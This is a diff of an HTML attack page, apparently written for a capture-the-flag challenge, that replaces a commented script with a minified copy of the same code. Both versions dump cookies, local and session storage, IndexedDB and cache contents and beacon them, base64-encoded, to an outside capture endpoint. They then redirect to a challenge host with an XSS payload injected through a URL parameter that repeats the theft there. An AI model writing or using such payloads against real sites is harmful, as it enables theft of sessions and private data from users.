@@ -1,139 +1,18 @@
 <!DOCTYPE html>
-<html>
-<body>
-<script>
-async function collectAllStores() {
-  // 1. Cookies
-  let cookies = document.cookie || '';
-
-  // 2. localStorage
-  let localStorageData = '';
-  try {
-    localStorageData = JSON.stringify(localStorage) || '';
-  } catch (e) { localStorageData = ''; }
-
-  // 3. sessionStorage
-  let sessionStorageData = '';
-  try {
-    sessionStorageData = JSON.stringify(sessionStorage) || '';
-  } catch (e) { sessionStorageData = ''; }
-
-  // 4. IndexedDB (dump all dbs and object stores)
-  async function dumpIndexedDB() {
-    if (!window.indexedDB) return '';
-    let out = {};
-    try {
-      let dbs = [];
-      if (indexedDB.databases) { // modern browsers
-        dbs = await indexedDB.databases();
-        dbs = dbs.map(db => db.name).filter(Boolean);
-      } else {
-        // fallback: common db names (guess)
-        dbs = ['db', 'database', 'test', 'flag', 'store'];
-      }
-      for (const dbName of dbs) {
-        try {
-          let req = indexedDB.open(dbName);
-          let db = await new Promise((res, rej) => {
-            req.onsuccess = () => res(req.result);
-            req.onerror = () => res(null);
-            req.onupgradeneeded = () => res(null);
-          });
-          if (!db) continue;
-          out[dbName] = {};
-          const objectStoreNames = Array.from(db.objectStoreNames);
-          for (const store of objectStoreNames) {
-            try {
-              let tx = db.transaction(store, 'readonly').objectStore(store).getAll();
-              let storeData = await new Promise((res, rej) => {
-                tx.onsuccess = () => res(tx.result);
-                tx.onerror = () => res('');
-              });
-              out[dbName][store] = storeData;
-            } catch (e) {
-              out[dbName][store] = '';
-            }
-          }
-          db.close();
-        } catch (e) {}
-      }
-      return JSON.stringify(out);
-    } catch (e) {
-      return '';
-    }
-  }
-  let indexedDBData = await dumpIndexedDB();
-
-  // 5. Cache Storage
-  async function dumpCaches() {
-    if (!window.caches) return '';
-    let out = {};
-    try {
-      const keys = await caches.keys();
-      for (const key of keys) {
-        try {
-          const cache = await caches.open(key);
-          const requests = await cache.keys();
-          out[key] = [];
-          for (const req of requests) {
-            try {
-              const resp = await cache.match(req);
-              let txt = '';
-              if (resp) {
-                try { txt = await resp.text(); } catch (e) { txt = ''; }
-              }
-              out[key].push({url: req.url, response: txt});
-            } catch (e) {}
-          }
-        } catch (e) {}
-      }
-      return JSON.stringify(out);
-    } catch (e) {
-      return '';
-    }
-  }
-  let cachesData = await dumpCaches();
-
-  // Bundle all
-  return {
-    cookie: cookies,
-    localStorage: localStorageData,
-    sessionStorage: sessionStorageData,
-    indexedDB: indexedDBData,
-    caches: cachesData
-  };
-}
-
-// EXFIL function
-function exfil(data, from) {
-  // URL encode entire data object
-  const payload = btoa(unescape(encodeURIComponent(JSON.stringify(data))));
-  (new Image()).src = `https://ssrf-eta.vercel.app/api/capture?from=${from}&c=${payload}`;
-}
-
-// MAIN
-(async function(){
-  // 1. Exfil from STATIC
-  const staticData = await collectAllStores();
-  exfil(staticData, 'static');
-
-  // 2. After 500ms, redirect to chal2 with injected XSS.
-  setTimeout(function() {
-    const payload = `
-      (async function(){
-        const collectAllStores = ${collectAllStores.toString()};
-        const exfil = ${exfil.toString()};
-        const chalData = await collectAllStores();
-        exfil(chalData, 'chal2');
-      })();
-    `.replace(/\n\s+/g, '');
-
-    // The injected payload is URI encoded and used as a JS XSS on chal2
-    const xss = `";eval(decodeURIComponent("${encodeURIComponent(payload)}"));//`;
-    const url = 'http://chal2.lagncra.sh:8426/?lang=' + encodeURIComponent(xss);
-    window.location.replace(url);
-  }, 500);
+<html><body><script>
+async function g(){
+  let c=document.cookie||'';
+  let l,s,i,x='';try{l=JSON.stringify(localStorage)}catch{}try{s=JSON.stringify(sessionStorage)}catch{}
+  try{if(window.indexedDB){i={};let d=window.indexedDB.databases?await window.indexedDB.databases():[{name:'db'}];
+  for(let dbn of d.map(db=>db.name).filter(Boolean)){try{let req=indexedDB.open(dbn),db=await new Promise(r=>{req.onsuccess=()=>r(req.result);req.onerror=()=>r()} );
+  if(db){i[dbn]={};for(let sn of Array.from(db.objectStoreNames)){try{let tx=db.transaction(sn).objectStore(sn).getAll(),st=await new Promise(r=>{tx.onsuccess=()=>r(tx.result);tx.onerror=()=>r('')});
+  i[dbn][sn]=st}catch{}}db.close();}}catch{}}i=JSON.stringify(i)}}catch{}try{if(window.caches){let ks=await caches.keys(),o={};
+  for(let k of ks){let cache=await caches.open(k),rq=await cache.keys();o[k]=[];for(let r of rq){try{let rs=await cache.match(r),t=rs?await rs.text():'';
+  o[k].push({u:r.url,r:t})}catch{}}}x=JSON.stringify(o)}}catch{}return{cookie:c,local:l||'',session:s||'',idb:i||'',caches:x||''}}
+function e(d,f){let p=btoa(unescape(encodeURIComponent(JSON.stringify(d))));(new Image).src=`https://ssrf-eta.vercel.app/api/capture?from=${f}&c=${p}`}
+(async()=>{e(await g(),'static');
+setTimeout(()=>{let p=`(async()=>{let g=${g.toString()},e=${e.toString()};e(await g(),'chal2')})();`;
+let xss=`";eval(decodeURIComponent("${encodeURIComponent(p)}"));//`;
+location.replace('http://chal2.lagncra.sh:8426/?lang='+encodeURIComponent(xss));},500);
 })();
-</script>
-</body>
-</html>
+</script></body></html>
